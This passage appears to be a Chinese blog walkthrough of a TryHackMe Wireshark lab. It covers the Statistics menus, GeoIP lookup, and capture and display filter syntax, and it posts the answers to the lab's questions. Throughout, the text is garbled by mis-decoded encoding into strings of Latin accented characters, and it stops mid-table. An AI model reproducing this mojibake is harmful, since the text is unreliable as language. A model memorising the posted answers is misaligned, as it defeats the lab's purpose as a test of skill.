/2ã€‚å¯¹äºŽå®‰å…¨åˆ†æžå¸ˆè€Œè¨€ï¼Œäº†è§£å¦‚ä½•åˆ©ç”¨è¿™äº›ç»Ÿè®¡ä¿¡æ¯è‡³å…³é‡è¦ã€‚æœ¬éƒ¨åˆ†æä¾›å·²å¤„ç†pcapæ–‡ä»¶çš„ç®€è¦æ¦‚è¿°ï¼Œå¸®åŠ©åˆ†æžå¸ˆä¸ºè°ƒæŸ¥å»ºç«‹å‡è®¾ã€‚æ‚¨å¯ä»¥ä½¿ç”¨  <strong>â€œç»Ÿè®¡â€</strong> èœå•æŸ¥çœ‹æ‰€æœ‰å¯ç”¨é€‰é¡¹ã€‚çŽ°åœ¨å¯åŠ¨æŒ‡å®šçš„è™šæ‹Ÿæœºï¼Œæ‰“å¼€ Wiresharkï¼ŒåŠ è½½â€œExercise.pcappngâ€æ–‡ä»¶ï¼Œå¹¶æŒ‰ç…§æ­¥éª¤è¿›è¡Œæ“ä½œã€‚</p>\n<h5 id=\"å·²è§£æžåœ°å€\">å·²è§£æžåœ°å€</h5>\n<p>æ­¤é€‰é¡¹é€šè¿‡æä¾›å·²è§£æžåœ°å€åŠå…¶ä¸»æœºåçš„åˆ—è¡¨ï¼Œå¸®åŠ©åˆ†æžäººå‘˜è¯†åˆ«æ•èŽ·æ–‡ä»¶ä¸­å¯ç”¨çš„ IP åœ°å€å’ŒDNSåç§°ã€‚è¯·æ³¨æ„ï¼Œä¸»æœºåä¿¡æ¯å–è‡ªæ•èŽ·æ–‡ä»¶ä¸­çš„DNSåº”ç­”ã€‚åˆ†æžäººå‘˜å¯ä»¥ä½¿ç”¨æ­¤èœå•å¿«é€Ÿè¯†åˆ«å·²è®¿é—®çš„èµ„æºã€‚å› æ­¤ï¼Œä»–ä»¬å¯ä»¥å¿«é€Ÿå‘çŽ°å·²è®¿é—®çš„èµ„æºï¼Œå¹¶æ ¹æ®æ„Ÿå…´è¶£çš„äº‹ä»¶å¯¹å…¶è¿›è¡Œè¯„ä¼°ã€‚æ‚¨å¯ä»¥ä½¿ç”¨  <strong>â€œç»Ÿè®¡ä¿¡æ¯ --&gt; å·²è§£æžåœ°å€â€</strong> èœå•æŸ¥çœ‹ Wireshark è§£æžçš„æ‰€æœ‰åœ°å€ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/c2af834e0c4fd1681e92be3884a70ede.png\" /></p>\n<h5 id=\"åè®®å±‚æ¬¡ç»“æž„\">åè®®å±‚æ¬¡ç»“æž„</h5>\n<p>æ­¤é€‰é¡¹ä¼šå°†æ•èŽ·æ–‡ä»¶ä¸­æ‰€æœ‰å¯ç”¨åè®®è¿›è¡Œç»†åˆ†ï¼Œå¹¶å¸®åŠ©åˆ†æžäººå‘˜æ ¹æ®æ•°æ®åŒ…è®¡æ•°å™¨å’Œç™¾åˆ†æ¯”ä»¥æ ‘çŠ¶è§†å›¾æŸ¥çœ‹è¿™äº›åè®®ã€‚å› æ­¤ï¼Œåˆ†æžäººå‘˜å¯ä»¥æŸ¥çœ‹ç«¯å£å’ŒæœåŠ¡çš„æ€»ä½“ä½¿ç”¨æƒ…å†µï¼Œå¹¶ä¸“æ³¨äºŽæ„Ÿå…´è¶£çš„äº‹ä»¶ã€‚ä¸Šä¸€èŠ‚ä¸­æåˆ°çš„é»„é‡‘æ³•åˆ™åœ¨æœ¬èŠ‚ä¸­åŒæ ·é€‚ç”¨ï¼›æ‚¨å¯ä»¥å³é”®å•å‡»å¹¶ç­›é€‰æ„Ÿå…´è¶£çš„äº‹ä»¶ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ <strong>â€œç»Ÿè®¡ä¿¡æ¯ --&gt; åè®®å±‚æ¬¡ç»“æž„â€ã€‚</strong></p>\n<p><img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/0b041bc45140f75ae3642f0555c7ed5f.png\" /></p>\n<h5 id=\"ä¼šè¯\">ä¼šè¯</h5>\n<p>ä¼šè¯ä»£è¡¨ä¸¤ä¸ªç‰¹å®šç«¯ç‚¹ä¹‹é—´çš„é€šä¿¡æµé‡ã€‚æ­¤é€‰é¡¹ä»¥äº”ç§åŸºæœ¬æ ¼å¼ï¼ˆä»¥å¤ªç½‘ã€IPv4ã€IPv6ã€ TCPå’ŒUDPï¼‰åˆ—å‡ºä¼šè¯ã€‚å› æ­¤ï¼Œåˆ†æžäººå‘˜å¯ä»¥è¯†åˆ«æ‰€æœ‰ä¼šè¯å¹¶è”ç³»æ„Ÿå…´è¶£çš„äº‹ä»¶çš„ç«¯ç‚¹ã€‚æ‚¨å¯ä»¥ä½¿ç”¨â€œç»Ÿè®¡ä¿¡æ¯ --&gt; ä¼šè¯â€èœå•æŸ¥çœ‹æ­¤ä¿¡æ¯ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/fe435a74166b71fc0c7a823df5e42a39.png\" /></p>\n<h5 id=\"ç»ˆç‚¹\">ç»ˆç‚¹</h5>\n<p>â€œç«¯ç‚¹â€é€‰é¡¹ä¸Žâ€œä¼šè¯â€é€‰é¡¹ç±»ä¼¼ã€‚å”¯ä¸€çš„åŒºåˆ«åœ¨äºŽï¼Œæ­¤é€‰é¡¹é’ˆå¯¹å•ä¸ªä¿¡æ¯å­—æ®µï¼ˆä»¥å¤ªç½‘ã€IPv4ã€IPv6ã€TCPå’ŒUDPï¼‰æä¾›å”¯ä¸€ä¿¡æ¯ã€‚å› æ­¤ï¼Œåˆ†æžäººå‘˜å¯ä»¥è¯†åˆ«æ•èŽ·æ–‡ä»¶ä¸­çš„å”¯ä¸€ç«¯ç‚¹ï¼Œå¹¶å°†å…¶ç”¨äºŽæ„Ÿå…´è¶£çš„äº‹ä»¶ã€‚æ‚¨å¯ä»¥ä½¿ç”¨â€œç»Ÿè®¡ä¿¡æ¯ --&gt; ç«¯ç‚¹â€èœå•æŸ¥çœ‹æ­¤ä¿¡æ¯ã€‚</p>\n<p>Wireshark è¿˜æ”¯æŒä½¿ç”¨ IEEE åˆ†é…çš„åˆ¶é€ å•†åç§°å°† MAC åœ°å€è§£æžä¸ºäººç±»å¯è¯»çš„æ ¼å¼ã€‚è¯·æ³¨æ„ï¼Œæ­¤è½¬æ¢ä»…ä½¿ç”¨ MAC åœ°å€çš„å‰ä¸‰ä¸ªå­—èŠ‚ï¼Œå¹¶ä¸”ä»…é€‚ç”¨äºŽå·²çŸ¥çš„åˆ¶é€ å•†ã€‚åœ¨æŸ¥çœ‹ä»¥å¤ªç½‘ç«¯ç‚¹æ—¶ï¼Œæ‚¨å¯ä»¥é€šè¿‡ç«¯ç‚¹çª—å£å·¦ä¸‹è§’çš„ <strong>â€œåç§°è§£æžâ€æŒ‰é’®å¯ç”¨æ­¤é€‰é¡¹ã€‚</strong><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/e402a958abc8aef18965e8da85addded.png\" /></p>\n<p>åç§°è§£æžä¸ä»…é™äºŽ MAC åœ°å€ã€‚Wireshark ä¹Ÿæä¾› IP åœ°å€å’Œç«¯å£åç§°è§£æžé€‰é¡¹ã€‚ä½†æ˜¯ï¼Œè¿™äº›é€‰é¡¹é»˜è®¤æƒ…å†µä¸‹æœªå¯ç”¨ã€‚å¦‚æžœæ‚¨æƒ³ä½¿ç”¨è¿™äº›åŠŸèƒ½ï¼Œéœ€è¦é€šè¿‡ <strong>â€œç¼–è¾‘ --&gt; é¦–é€‰é¡¹ --&gt; åç§°è§£æžâ€</strong> èœå•å°†å…¶æ¿€æ´»ã€‚å¯ç”¨ IP åœ°å€å’Œç«¯å£åç§°è§£æžåŽï¼Œæ‚¨å°†åœ¨æ•°æ®åŒ…åˆ—è¡¨çª—æ ¼ä¸­çœ‹åˆ°è§£æžåŽçš„ IP åœ°å€å’Œç«¯å£åç§°ï¼Œä¹Ÿå¯ä»¥åœ¨â€œä¼šè¯â€å’Œâ€œç«¯ç‚¹â€èœå•ä¸­æŸ¥çœ‹è§£æžåŽçš„åç§°ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/2a4919ff9a8662f23feed14cf5142f3f.png\" /><br />\nå¸¦æœ‰åç§°è§£æžçš„ç«¯ç‚¹èœå•è§†å›¾ï¼š<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/f6929a762ee5f3943388c38fb3d18289.png\" /><br />\né™¤äº†åç§°è§£æžä¹‹å¤–ï¼ŒWireshark è¿˜æä¾› IP åœ°ç†ä½ç½®æ˜ å°„åŠŸèƒ½ï¼Œå¸®åŠ©åˆ†æžäººå‘˜è¯†åˆ«åœ°å›¾çš„æºåœ°å€å’Œç›®æ ‡åœ°å€ã€‚ä½†æ­¤åŠŸèƒ½é»˜è®¤æƒ…å†µä¸‹æœªå¯ç”¨ï¼Œéœ€è¦ GeoIP æ•°æ®åº“ç­‰è¡¥å……æ•°æ®ã€‚ç›®å‰ï¼ŒWireshark æ”¯æŒ MaxMind æ•°æ®åº“ï¼Œæœ€æ–°ç‰ˆæœ¬çš„ Wireshark å·²é¢„è£… MaxMind æ•°æ®åº“è§£æžå™¨ã€‚ä¸è¿‡ï¼Œæ‚¨ä»ç„¶éœ€è¦ MaxMind æ•°æ®åº“æ–‡ä»¶ï¼Œå¹¶é€šè¿‡â€œç¼–è¾‘ --&gt; é¦–é€‰é¡¹ --&gt; åç§°è§£æž --&gt; MaxMind æ•°æ®åº“ç›®å½•â€èœå•å‘ Wireshark æä¾›æ•°æ®åº“è·¯å¾„ã€‚ä¸‹è½½å¹¶æŒ‡å®šè·¯å¾„åŽï¼ŒWireshark å°†è‡ªåŠ¨åœ¨ IP åè®®è¯¦ç»†ä¿¡æ¯ä¸‹æä¾›åŒ¹é… IP åœ°å€çš„ GeoIP ä¿¡æ¯ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/c31531988a1ede5a3eb588aa5ce4a746.png\" /><br />\nç«¯ç‚¹å’Œ GeoIP è§†å›¾ï¼š<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/0ee77ac4d9640fce5b8308d3f2cf297e.png\" /><br />\n<strong>æ³¨æ„ï¼šæ‚¨éœ€è¦è¿žæŽ¥äº’è”ç½‘æ‰èƒ½æŸ¥çœ‹ GeoIP åœ°å›¾ã€‚</strong></p>\n<hr />\n<p>è¯·å›žç­”ä»¥ä¸‹é—®é¢˜</p>\n<p>è°ƒæŸ¥å·²è§£æžçš„åœ°å€ã€‚ä¸»æœºåä»¥â€œbbcâ€å¼€å¤´çš„IPåœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ<br />\nç»Ÿè®¡-&gt;åœ°å€è§£æžï¼Œæœç´¢bbcå³å¯<br />\n<img alt=\"400\" src=\"https://i-blog.csdnimg.cn/img_convert/b755360dd748a7f3a8264be18cdfffda.png\" /></p>\n<pre><code class=\"language-python\">199.232.24.81\n</code></pre>\n<p>IPv4 ä¼šè¯æ•°æ˜¯å¤šå°‘ï¼Ÿ<br />\n<img alt=\"400\" src=\"https://i-blog.csdnimg.cn/img_convert/dcad2402ebde2dc784f875de8c8e42be.png\" /></p>\n<pre><code class=\"language-python\">435\n</code></pre>\n<p>ä»Žâ€œMicro-Stâ€MACåœ°å€ä¼ è¾“äº†å¤šå°‘å­—èŠ‚ï¼ˆkï¼‰ï¼Ÿ<br />\næ‰“å¼€ç«¯ç‚¹æŸ¥çœ‹å³å¯<br />\n<img alt=\"400\" src=\"https://i-blog.csdnimg.cn/img_convert/673c9c730bcff1a2e786c25681df9801.png\" /></p>\n<pre><code class=\"language-python\">7474\n</code></pre>\n<p>ä¸Žâ€œKansas Cityâ€å…³è”çš„ IP åœ°å€æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ<br />\n<img alt=\"400\" src=\"https://i-blog.csdnimg.cn/img_convert/a594e79bd61d224ffb968a065098dd55.png\" /></p>\n<pre><code class=\"language-python\">4\n</code></pre>\n<p>ä¸Žâ€œBlicnetâ€ASç»„ç»‡å…³è”çš„IPåœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ<br />\n<img alt=\"400\" src=\"https://i-blog.csdnimg.cn/img_convert/c26815ea71db5b2d72dad7ffc9aff17d.png\" /></p>\n<pre><code class=\"language-python\">188.246.82.7\n</code></pre>\n<h4 id=\"ç»Ÿè®¡æ•°æ®--åè®®è¯¦æƒ…\">ç»Ÿè®¡æ•°æ® | åè®®è¯¦æƒ…</h4>\n<h5 id=\"ipv4-å’Œ-ipv6\">IPv4 å’Œ IPv6</h5>\n<p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œå‡ ä¹Žæ‰€æœ‰é€‰é¡¹éƒ½æä¾›äº†åŒ…å«ä¸¤ç§IPåœ°å€ç‰ˆæœ¬çš„ä¿¡æ¯ã€‚ç»Ÿè®¡èœå•æä¾›äº†ä¸¤ä¸ªé€‰é¡¹ï¼Œç”¨äºŽç­›é€‰åŒ…å«ç‰¹å®šIPç‰ˆæœ¬çš„åŒ…ç»Ÿè®¡ä¿¡æ¯ã€‚å› æ­¤ï¼Œåˆ†æžäººå‘˜å¯ä»¥åœ¨ä¸€ä¸ªçª—å£ä¸­è¯†åˆ«å¹¶åˆ—å‡ºæ‰€æœ‰ä¸Žç‰¹å®šIPç‰ˆæœ¬å…³è”çš„äº‹ä»¶ï¼Œå¹¶å°†å…¶ç”¨äºŽæ„Ÿå…´è¶£çš„äº‹ä»¶ã€‚æ‚¨å¯ä»¥ä½¿ç”¨â€œç»Ÿè®¡ä¿¡æ¯ --&gt; IPvXç»Ÿè®¡ä¿¡æ¯â€èœå•æŸ¥çœ‹æ­¤ä¿¡æ¯ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/2921b466c65ade1e6d4b361641c81f1d.png\" /></p>\n<h5 id=\"dns\">DNS</h5>\n<p>æ­¤é€‰é¡¹ä¼šå°†æ•èŽ·æ–‡ä»¶ä¸­çš„æ‰€æœ‰DNSæ•°æ®åŒ…è¿›è¡Œç»†åˆ†ï¼Œå¹¶å¸®åŠ©åˆ†æžäººå‘˜æ ¹æ®æ•°æ®åŒ…è®¡æ•°å™¨å’ŒDNSåè®®ç™¾åˆ†æ¯”ä»¥æ ‘çŠ¶è§†å›¾æŸ¥çœ‹åˆ†æžç»“æžœã€‚å› æ­¤ï¼Œåˆ†æžäººå‘˜å¯ä»¥æŸ¥çœ‹DNSæœåŠ¡çš„æ€»ä½“ä½¿ç”¨æƒ…å†µï¼ŒåŒ…æ‹¬ rcodeã€opcodeã€classã€query typeã€æœåŠ¡å’ŒæŸ¥è¯¢ç»Ÿè®¡ä¿¡æ¯ï¼Œå¹¶å°†å…¶ç”¨äºŽæ„Ÿå…´è¶£çš„äº‹ä»¶ã€‚æ‚¨å¯ä»¥ä½¿ç”¨  <strong>â€œç»Ÿè®¡ä¿¡æ¯ --&gt; DNS â€</strong> èœå•æŸ¥çœ‹æ­¤ä¿¡æ¯ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/253d6c0062debfff69a7f26310dba93c.png\" /></p>\n<h5 id=\"http\">HTTP</h5>\n<p>æ­¤é€‰é¡¹ä¼šå°†æ•èŽ·æ–‡ä»¶ä¸­çš„æ‰€æœ‰HTTPæ•°æ®åŒ…è¿›è¡Œç»†åˆ†ï¼Œå¹¶å¸®åŠ©åˆ†æžäººå‘˜æ ¹æ®æ•°æ®åŒ…è®¡æ•°å™¨å’ŒHTTPåè®®ç™¾åˆ†æ¯”ä»¥æ ‘çŠ¶è§†å›¾æŸ¥çœ‹åˆ†æžç»“æžœã€‚å› æ­¤ï¼Œåˆ†æžäººå‘˜å¯ä»¥æŸ¥çœ‹HTTPæœåŠ¡çš„æ€»ä½“ä½¿ç”¨æƒ…å†µï¼ŒåŒ…æ‹¬è¯·æ±‚å’Œå“åº”ä»£ç ä»¥åŠåŽŸå§‹è¯·æ±‚ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ <strong>â€œç»Ÿè®¡ä¿¡æ¯ --&gt; HTTP â€</strong> èœå•æŸ¥çœ‹æ­¤ä¿¡æ¯ã€‚</p>\n<p><img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/78a7824ba9feab308e8044a4ed5da46e.png\" /></p>\n<hr />\n<p>è¯·å›žç­”ä»¥ä¸‹é—®é¢˜</p>\n<p>æœ€å¸¸ç”¨çš„IPv4ç›®æ ‡åœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ<br />\næ‰“å¼€ç›®æ ‡åœ°å€å’Œç«¯å£ï¼Œç‚¹å‡»æŽ’åºä¸€ä¸‹å³å¯çŸ¥é“è°çš„ç™¾åˆ†æ¯”å æœ€å¤š<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/ab9829d4ee447ed6b12ba03e2ca8bd28.png\" /></p>\n<pre><code class=\"language-python\">10.100.1.33\n</code></pre>\n<p>DNSæ•°æ®åŒ…çš„æœ€å¤§æœåŠ¡è¯·æ±‚-å“åº”æ—¶é—´æ˜¯å¤šå°‘ï¼Ÿ<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/bafecf1cc84fb21686177a3c9eca2245.png\" /></p>\n<pre><code class=\"language-python\">0.467897\n</code></pre>\n<p><code>â€œrad[.]msn[.]comâ€</code>å®Œæˆäº†å¤šå°‘ä¸ªHTTPè¯·æ±‚ï¼Ÿ<br />\nç‚¹å¼€dnsçš„ç»Ÿè®¡ï¼Œç„¶åŽæ‰¾åˆ°è¯¥åŸŸåï¼Œå¾€å³è¾¹åˆ’<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/6002ad8eec336d34a52c8b997b0f0c04.png\" /><br />\nå°±èƒ½çœ‹åˆ°è®¡æ•°äº†<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/6c18cef0d7d354abda670dd76db049ce.png\" /></p>\n<pre><code class=\"language-python\">39\n</code></pre>\n<h4 id=\"æ•°æ®åŒ…è¿‡æ»¤--åŽŸç†\">æ•°æ®åŒ…è¿‡æ»¤ | åŽŸç†</h4>\n<p>åœ¨ä¸Šä¸€èŠ‚è¯¾ï¼ˆ<a href=\"https://tryhackme.com/room/wiresharkthebasics\" rel=\"noopener nofollow\" target=\"_blank\">Wiresharkï¼šåŸºç¡€ç¯‡</a>ï¼‰ä¸­ï¼Œæˆ‘ä»¬è®²è§£äº†æ•°æ®åŒ…è¿‡æ»¤ä»¥åŠå¦‚ä½•åœ¨ä¸ä½¿ç”¨æŸ¥è¯¢çš„æƒ…å†µä¸‹è¿‡æ»¤æ•°æ®åŒ…ã€‚æœ¬èŠ‚è¯¾æˆ‘ä»¬å°†ä½¿ç”¨æŸ¥è¯¢æ¥è¿‡æ»¤æ•°æ®åŒ…ã€‚å¦‚å‰æ‰€è¿°ï¼ŒWireshark ä¸­æœ‰ä¸¤ç§ç±»åž‹çš„è¿‡æ»¤å™¨ã€‚è™½ç„¶å®ƒä»¬çš„è¯­æ³•ç›¸ä¼¼ï¼Œä½†ç”¨é€”ä¸åŒã€‚è®©æˆ‘ä»¬å›žé¡¾ä¸€ä¸‹è¿™ä¸¤ç§è¿‡æ»¤å™¨çš„åŒºåˆ«ã€‚</p>\n<table>\n<thead>\n<tr>\n<th><strong>æ•èŽ·è¿‡æ»¤å™¨</strong></th>\n<th>è¿™ç§ç±»åž‹çš„è¿‡æ»¤å™¨ç”¨äºŽä»…ä¿å­˜æµé‡çš„ç‰¹å®šéƒ¨åˆ†ã€‚å®ƒåœ¨æ•èŽ·æµé‡ä¹‹å‰è®¾ç½®ï¼Œå¹¶ä¸”åœ¨æ•èŽ·è¿‡ç¨‹ä¸­æ— æ³•æ›´æ”¹ã€‚</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>æ˜¾ç¤ºç­›é€‰å™¨</strong></td>\n<td>è¿™ç§ç±»åž‹çš„è¿‡æ»¤å™¨ç”¨äºŽé€šè¿‡å‡å°‘å¯è§æ•°æ®åŒ…çš„æ•°é‡æ¥è°ƒæŸ¥æ•°æ®åŒ…ï¼Œå¹¶ä¸”åœ¨æ•èŽ·è¿‡ç¨‹ä¸­å¯ä»¥æ›´æ”¹ã€‚</td>\n</tr>\n</tbody>\n</table>\n<p><strong>æ³¨æ„ï¼š</strong> æ‚¨ä¸èƒ½ä½¿ç”¨æ˜¾ç¤ºç­›é€‰è¡¨è¾¾å¼æ¥æ•èŽ·æµé‡ï¼Œåä¹‹äº¦ç„¶ã€‚</p>\n<p>å…¸åž‹çš„ä½¿ç”¨åœºæ™¯æ˜¯æ•èŽ·æ‰€æœ‰æ•°æ®åŒ…ï¼Œç„¶åŽæ ¹æ®æ„Ÿå…´è¶£çš„äº‹ä»¶è¿›è¡Œè¿‡æ»¤ã€‚åªæœ‰ç»éªŒä¸°å¯Œçš„ä¸“ä¸šäººå‘˜æ‰ä¼šä½¿ç”¨æ•èŽ·è¿‡æ»¤å™¨å¹¶å—…æŽ¢æµé‡ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆ Wireshark åœ¨æ˜¾ç¤ºè¿‡æ»¤å™¨ä¸­æ”¯æŒæ›´å¤šåè®®ç±»åž‹çš„åŽŸå› ã€‚è¯·åŠ¡å¿…åœ¨å®žé™…çŽ¯å¢ƒä¸­ä½¿ç”¨æ•èŽ·è¿‡æ»¤å™¨ä¹‹å‰ï¼Œå½»åº•äº†è§£å¦‚ä½•ä½¿ç”¨å®ƒä»¬ã€‚è®°ä½ï¼Œå¦‚æžœæ‚¨çš„æ•èŽ·è¿‡æ»¤å™¨ä¸Žæ‚¨è¦æŸ¥æ‰¾çš„ç‰¹å®šæµé‡æ¨¡å¼ä¸åŒ¹é…ï¼Œæ‚¨å°†æ— æ³•æ•èŽ·åˆ°æ„Ÿå…´è¶£çš„äº‹ä»¶ã€‚</p>\n<h5 id=\"æ•èŽ·è¿‡æ»¤å™¨è¯­æ³•\">æ•èŽ·è¿‡æ»¤å™¨è¯­æ³•</h5>\n<p>è¿™äº›è¿‡æ»¤å™¨ä½¿ç”¨å­—èŠ‚åç§»é‡ã€åå…­è¿›åˆ¶å€¼å’ŒæŽ©ç ä»¥åŠå¸ƒå°”è¿ç®—ç¬¦ï¼Œå› æ­¤ä¹ä¸€çœ‹å¹¶ä¸å®¹æ˜“ç†è§£/é¢„æµ‹å…¶ç”¨é€”ã€‚åŸºæœ¬è¯­æ³•è§£é‡Šå¦‚ä¸‹ï¼š</p>\n<ul>\n<li><strong>Scopeä½œç”¨åŸŸï¼š</strong> ä¸»æœºã€ç½‘ç»œã€ç«¯å£å’Œç«¯å£èŒƒå›´ã€‚</li>\n<li><strong>Directionæ–¹å‘ï¼š</strong> æºã€ç›®æ ‡ã€æºæˆ–ç›®æ ‡ã€æºå’Œç›®æ ‡ï¼Œ</li>\n<li><strong>Protocolåè®®ï¼š</strong> ä»¥å¤ªç½‘ã€WLANã€IPã€IP6ã€ARPã€RARPã€TCPå’ŒUDPã€‚</li>\n<li><strong>ç”¨äºŽæ•èŽ·ç«¯å£ 80 æµé‡çš„ç¤ºä¾‹è¿‡æ»¤å™¨ï¼š</strong> <code>tcp port 80</code></li>\n</ul>\n<p>æ‚¨å¯ä»¥ç‚¹å‡» <a href=\"https://www.wireshark.org/docs/man-pages/pcap-filter.html\" rel=\"noopener nofollow\" target=\"_blank\">æ­¤å¤„ï¼šhttps://www.wireshark.org/docs/man-pages/pcap-filter.html</a> å’Œ <a href=\"https://gitlab.com/wireshark/wireshark/-/wikis/CaptureFilters#useful-filters\" rel=\"noopener nofollow\" target=\"_blank\">æ­¤å¤„ï¼šhttps://gitlab.com/wireshark/wireshark/-/wikis/CaptureFilters#useful-filters</a>é˜…è¯»æ›´å¤šå…³äºŽæ•èŽ·è¿‡æ»¤å™¨è¯­æ³•çš„ä¿¡æ¯ã€‚å¿«é€Ÿå‚è€ƒæŒ‡å—ä½äºŽ <strong>â€œæ•èŽ· --&gt; æ•èŽ·è¿‡æ»¤å™¨â€</strong> èœå•ä¸‹ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/5110f7ffdc7c2286e38913f9d83bde0b.png\" /></p>\n<h5 id=\"æ˜¾ç¤ºç­›é€‰è¯­æ³•\">æ˜¾ç¤ºç­›é€‰è¯­æ³•</h5>\n<p>è¿™æ˜¯ Wireshark æœ€å¼ºå¤§çš„åŠŸèƒ½ã€‚å®ƒæ”¯æŒ 3000 ç§åè®®ï¼Œå¹¶å…è®¸åœ¨åè®®åˆ†ç±»ä¸‹è¿›è¡Œæ•°æ®åŒ…çº§åˆ«çš„æœç´¢ã€‚å®˜æ–¹çš„â€œ<a href=\"https://www.wireshark.org/docs/dfref/\" rel=\"noopener nofollow\" target=\"_blank\">æ˜¾ç¤ºè¿‡æ»¤å™¨å‚è€ƒï¼šhttps://www.wireshark.org/docs/dfref/</a>â€æä¾›äº†æ‰€æœ‰å—æ”¯æŒçš„åè®®åˆ†ç±»ï¼Œæ–¹ä¾¿è¿›è¡Œè¿‡æ»¤ã€‚</p>\n<ul>\n<li><strong>ç”¨äºŽæ•èŽ·ç«¯å£ 80 æµé‡çš„ç¤ºä¾‹è¿‡æ»¤å™¨ï¼š</strong> <code>tcp.port == 80</code></li>\n</ul>\n<p>Wireshark å†…ç½®äº†ä¸€ä¸ªé€‰é¡¹ï¼ˆæ˜¾ç¤ºè¿‡æ»¤å™¨è¡¨è¾¾å¼ï¼‰ï¼Œç”¨äºŽå­˜å‚¨æ‰€æœ‰å—æ”¯æŒçš„åè®®ç»“æž„ï¼Œä»¥å¸®åŠ©åˆ†æžäººå‘˜åˆ›å»ºæ˜¾ç¤ºè¿‡æ»¤å™¨ã€‚æˆ‘ä»¬ç¨åŽä¼šä»‹ç»â€œæ˜¾ç¤ºè¿‡æ»¤å™¨è¡¨è¾¾å¼â€èœå•ã€‚çŽ°åœ¨ï¼Œè®©æˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹æ˜¾ç¤ºè¿‡æ»¤å™¨æ“ä½œçš„åŸºæœ¬åŽŸç†ã€‚æ‚¨å¯ä»¥åœ¨ <strong>â€œåˆ†æž --&gt; æ˜¾ç¤ºè¿‡æ»¤å™¨â€</strong> èœå•ä¸‹æ‰¾åˆ°å¿«é€Ÿå‚è€ƒã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/ca347cd1f0ef0b9067df1dc2ce47f92a.png\" /></p>\n<h5 id=\"æ¯”è¾ƒè¿ç®—ç¬¦\">æ¯”è¾ƒè¿ç®—ç¬¦</h5>\n<p>æ‚¨å¯ä»¥ä½¿ç”¨ä¸åŒçš„æ¯”è¾ƒè¿ç®—ç¬¦åˆ›å»ºæ˜¾ç¤ºç­›é€‰å™¨ï¼Œä»¥æŸ¥æ‰¾æ„Ÿå…´è¶£çš„äº‹ä»¶ã€‚ä¸»è¦è¿ç®—ç¬¦å¦‚ä¸‹è¡¨æ‰€ç¤ºã€‚</p>\n<table>\n<thead>\n<tr>\n<th><strong>è‹±è¯­</strong></th>\n<th><strong>C ç±»</strong></th>\n<th><strong>æè¿°</strong></th>\n<th><strong>ä¾‹å­</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>æ–¹ç¨‹</td>\n<td>==</td>\n<td>å¹³ç­‰çš„</td>\n<td><code>ip.src == 10.10.10.100</code></td>\n</tr>\n<tr>\n<td>ne</td>\n<td>!=</td>\n<td>ä¸ç­‰äºŽ</td>\n<td><code>ip.src != 10.10.10.100</code></td>\n</tr>\n<tr>\n<td>gt</td>\n<td>&gt;</td>\n<td>å¤§äºŽ</td>\n<td><code>ip.ttl &gt; 250</code></td>\n</tr>\n<tr>\n<td>lt</td>\n<td>&lt;</td>\n<td>å°‘äºŽ</td>\n<td><code>ip.ttl &lt; 10</code></td>\n</tr>\n<tr>\n<td>ge</td>\n<td>&gt;=</td>\n<td>å¤§äºŽæˆ–ç­‰äºŽ</td>\n<td><code>ip.ttl &gt;= 0xFA</code></td>\n</tr>\n<tr>\n<td>å‹’</td>\n<td>&lt;=</td>\n<td>å°äºŽæˆ–ç­‰äºŽ</td>\n<td><code>ip.ttl &lt;= 0xA</code></td>\n</tr>\n</tbody>\n</table>\n<p><strong>æ³¨æ„ï¼š</strong>  Wireshark æ”¯æŒä½¿ç”¨åè¿›åˆ¶å’Œåå…­è¿›åˆ¶å€¼è¿›è¡Œè¿‡æ»¤ã€‚æ‚¨å¯ä»¥æ ¹æ®æœç´¢éœ€è¦ä½¿ç”¨ä»»ä½•æ ¼å¼ã€‚</p>\n<h5 id=\"é€»è¾‘è¡¨è¾¾å¼\">é€»è¾‘è¡¨è¾¾å¼</h5>\n<p>Wireshark æ”¯æŒå¸ƒå°”è¯­æ³•ã€‚æ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨é€»è¾‘è¿ç®—ç¬¦åˆ›å»ºæ˜¾ç¤ºè¿‡æ»¤å™¨ã€‚</p>\n<table>\n<thead>\n<tr>\n<th><strong>è‹±è¯­</strong></th>\n<th><strong>C ç±»</strong></th>\n<th><strong>æè¿°</strong></th>\n<th><strong>ä¾‹å­</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>å’Œ</td>\n<td>&amp;&amp;</td>\n<td>é€»è¾‘å’Œ</td>\n<td><code>(ip.src == 10.10.10.100) AND (ip.src == 10.10.10.111)</code></td>\n</tr>\n<tr>\n<td>æˆ–è€…</td>\n<td>||</td>\n<td>é€»è¾‘æˆ–</td>\n<td><code>(ip.src == 10.10.10.100) OR (ip.src == 